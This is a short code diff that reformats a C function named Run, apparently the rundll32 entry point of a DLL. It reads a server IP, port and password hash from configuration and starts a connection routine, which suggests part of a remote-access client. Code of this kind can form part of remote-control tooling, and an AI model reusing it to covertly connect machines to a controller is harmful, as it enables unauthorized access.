@@ -404,14 +404,15 @@ extern DLL_API DWORD WINAPI run(LPVOID param)
     return 0;
 }
 
-extern DLL_API void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
-	assert(sizeof(struct CONNECT_ADDRESS) == 300);
-	PluginParam param = { 0 };
-	strcpy(param.IP, g_Server.szServerIP);
-	param.Port = atoi(g_Server.szPort);
-	param.User = g_Server.pwdHash;
-	DWORD result = run(&param);
-	Sleep(INFINITE);
+extern DLL_API void Run(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
+{
+    assert(sizeof(struct CONNECT_ADDRESS) == 300);
+    PluginParam param = { 0 };
+    strcpy(param.IP, g_Server.szServerIP);
+    param.Port = atoi(g_Server.szPort);
+    param.User = g_Server.pwdHash;
+    DWORD result = run(&param);
+    Sleep(INFINITE);
 }
 
 #ifndef _WINDLL
